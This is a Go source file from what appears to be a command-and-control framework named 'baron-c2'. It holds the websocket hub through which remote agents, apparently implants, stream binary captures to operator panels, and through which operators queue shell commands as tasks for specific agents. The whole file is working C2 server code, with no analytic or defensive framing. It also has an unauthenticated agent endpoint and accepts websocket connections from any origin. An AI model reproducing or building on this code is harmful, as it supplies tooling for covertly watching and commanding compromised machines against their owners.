package api

import (
	"encoding/json"
	"net/http"
	"net/url"
	"sync"
	"time"

	"baron-c2/internal/auth"
	"baron-c2/internal/repo"
	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"github.com/rs/zerolog/log"
)

// BinaryStreamHub handles raw binary frames from agents and multicasts to panels
type BinaryStreamHub struct {
	clients map[string]map[*websocket.Conn]bool // agentID -> list of panel connections
	mu      sync.RWMutex
}

var GlobalStreamHub = &BinaryStreamHub{
	clients: make(map[string]map[*websocket.Conn]bool),
}

func (h *BinaryStreamHub) RegisterPanel(agentID string, conn *websocket.Conn) {
	h.mu.Lock()
	defer h.mu.Unlock()
	if h.clients[agentID] == nil {
		h.clients[agentID] = make(map[*websocket.Conn]bool)
	}
	h.clients[agentID][conn] = true
}

func (h *BinaryStreamHub) UnregisterPanel(agentID string, conn *websocket.Conn) {
	h.mu.Lock()
	defer h.mu.Unlock()
	if _, ok := h.clients[agentID]; ok {
		delete(h.clients[agentID], conn)
	}
}

func (h *BinaryStreamHub) Broadcast(agentID string, data []byte) {
	h.mu.RLock()
	panels, ok := h.clients[agentID]
	h.mu.RUnlock()

	if !ok {
		return
	}

	for p := range panels {
		err := p.WriteMessage(websocket.BinaryMessage, data)
		if err != nil {
			log.Debug().Err(err).Str("agent", agentID).Msg("Failed to send binary frame to panel")
			h.UnregisterPanel(agentID, p)
			p.Close()
		}
	}
}

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

// Hub maintains the set of active clients and broadcasts messages
type Hub struct {
	clients    map[*websocket.Conn]bool
	broadcast  chan interface{}
	register   chan *websocket.Conn
	unregister chan *websocket.Conn
	mu         sync.Mutex
}

var GlobalHub = &Hub{
	clients:    make(map[*websocket.Conn]bool),
	broadcast:  make(chan interface{}, 256),
	register:   make(chan *websocket.Conn),
	unregister: make(chan *websocket.Conn),
}

func (h *Hub) Run() {
	for {
		select {
		case client := <-h.register:
			h.mu.Lock()
			h.clients[client] = true
			h.mu.Unlock()
		case client := <-h.unregister:
			h.mu.Lock()
			if _, ok := h.clients[client]; ok {
				delete(h.clients, client)
				client.Close()
			}
			h.mu.Unlock()
		case message := <-h.broadcast:
			h.mu.Lock()
			for client := range h.clients {
				err := client.WriteJSON(message)
				if err != nil {
					log.Warn().Err(err).Msg("websocket write error, dropping client")
					client.Close()
					delete(h.clients, client)
				}
			}
			h.mu.Unlock()
		}
	}
}

// PanelStreamWS handles binary stream subscriptions for the panel
func PanelStreamWS(c *gin.Context) {
	tok := c.Query("token")
	if tok == "" {
		tok = c.GetHeader("X-Token")
	}
	if _, _, err := auth.ParsePanelToken(tok); err != nil {
		c.String(http.StatusUnauthorized, "Unauthorized")
		return
	}

	agentID := c.Query("cid")
	if agentID == "" {
		c.String(http.StatusBadRequest, "Missing cid")
		return
	}

	conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		log.Warn().Err(err).Msg("Panel stream upgrade failed")
		return
	}

	GlobalStreamHub.RegisterPanel(agentID, conn)

	defer func() {
		GlobalStreamHub.UnregisterPanel(agentID, conn)
		conn.Close()
	}()

	// Keep alive
	for {
		if _, _, err := conn.ReadMessage(); err != nil {
			break
		}
	}
}

// AgentStreamWS handles binary frame uploads from agents over WebSocket
func AgentStreamWS(c *gin.Context) {
	agentID := c.Query("id")
	if agentID == "" {
		c.String(http.StatusBadRequest, "Missing id")
		return
	}

	conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		log.Warn().Err(err).Msg("Agent stream upgrade failed")
		return
	}

	defer conn.Close()

	for {
		messageType, data, err := conn.ReadMessage()
		if err != nil {
			break
		}

		if messageType == websocket.BinaryMessage {
			// Broadcast to all panels subscribed to this agent
			GlobalStreamHub.Broadcast(agentID, data)
		}
	}
}

// wsIncoming represents a message sent FROM the panel TO the server over WebSocket
type wsIncoming struct {
	Event string          `json:"event"`
	Data  json.RawMessage `json:"data"`
}

// wsCommand is the payload for a "command" event from the panel
type wsCommand struct {
	CID    string `json:"cid"`
	Action string `json:"action"`
	Cmd    string `json:"cmd"`     // optional shell command string
}

// WSHandler handles websocket requests from the panel.
func WSHandler(c *gin.Context) {
	token := c.Query("token")
	if token == "" {
		token = c.GetHeader("Sec-WebSocket-Protocol")
	}
	user, _, err := auth.ParsePanelToken(token)
	if err != nil || user == "" {
		c.JSON(http.StatusUnauthorized, gin.H{"ok": false, "error": "invalid token"})
		return
	}

	conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		log.Warn().Err(err).Msg("websocket upgrade failed")
		return
	}

	GlobalHub.register <- conn

	defer func() {
		GlobalHub.unregister <- conn
	}()

	_ = conn.WriteJSON(gin.H{
		"event": "auth_ok",
		"data":  gin.H{"user": user},
	})

	for {
		_, raw, err := conn.ReadMessage()
		if err != nil {
			break
		}

		var msg wsIncoming
		if err := json.Unmarshal(raw, &msg); err != nil {
			continue
		}

		switch msg.Event {
		case "auth":
			// Token validated at upgrade; optional refresh ignored
		case "command":
			handleWSCommand(msg.Data)
		case "subscribe_stream":
			var d struct {
				CID string `json:"cid"`
			}
			_ = json.Unmarshal(msg.Data, &d)
			if d.CID != "" {
				proto := "ws"
				if c.Request.TLS != nil || c.GetHeader("X-Forwarded-Proto") == "https" {
					proto = "wss"
				}
				host := c.Request.Host
				if fh := c.GetHeader("X-Forwarded-Host"); fh != "" {
					host = fh
				}
				u := proto + "://" + host + "/api/panel/stream_ws?cid=" + url.QueryEscape(d.CID) + "&token=" + url.QueryEscape(token)
				_ = conn.WriteJSON(gin.H{
					"event": "stream_hint",
					"data":  gin.H{"url": u, "cid": d.CID},
				})
			}
		}
	}
}

// handleWSCommand receives a command from the panel WebSocket,
// saves it as a pending task in the DB, and broadcasts confirmation.
func handleWSCommand(raw json.RawMessage) {
	var cmd wsCommand
	if err := json.Unmarshal(raw, &cmd); err != nil {
		log.Warn().Err(err).Msg("ws command: failed to parse")
		return
	}

	if cmd.CID == "" || cmd.Action == "" {
		log.Warn().Str("cid", cmd.CID).Str("action", cmd.Action).Msg("ws command: missing cid or action")
		return
	}

	fullCmd := cmd.Action
	if cmd.Cmd != "" {
		fullCmd += " " + cmd.Cmd
	}

	task := repo.Task{
		ID:        repo.GenerateID(),
		ClientID:  cmd.CID,
		Command:   fullCmd,
		Status:    "pending",
		CreatedAt: time.Now(),
	}

	if err := repo.DB.Create(&task).Error; err != nil {
		log.Error().Err(err).Str("cid", cmd.CID).Msg("ws command: db error")
		return
	}

	log.Info().Str("cid", cmd.CID).Str("cmd", fullCmd).Str("task_id", task.ID).Msg("task queued via ws")

	// Notify all panel clients about the queued task
	Broadcast(gin.H{
		"event": "task_queued",
		"data": gin.H{
			"cid":     cmd.CID,
			"task_id": task.ID,
			"task":    gin.H{"action": cmd.Action},
		},
	})

	tid := task.ID
	if len(tid) > 8 {
		tid = tid[:8]
	}
	GlobalHub.BroadcastSystem("TASK: <" + cmd.Action + "> queued for " + cmd.CID + " (id: " + tid + ")")
}

// Broadcast sends a message to all connected panel users (non-blocking; drops if queue full).
func Broadcast(msg interface{}) {
	select {
	case GlobalHub.broadcast <- msg:
	default:
		log.Warn().Msg("hub broadcast queue full, dropping message")
	}
}

// BroadcastSystem sends a system message to the panel terminal
func (h *Hub) BroadcastSystem(msg string) {
	Broadcast(gin.H{
		"event": "log_sys",
		"data":  gin.H{"msg": msg},
	})
}
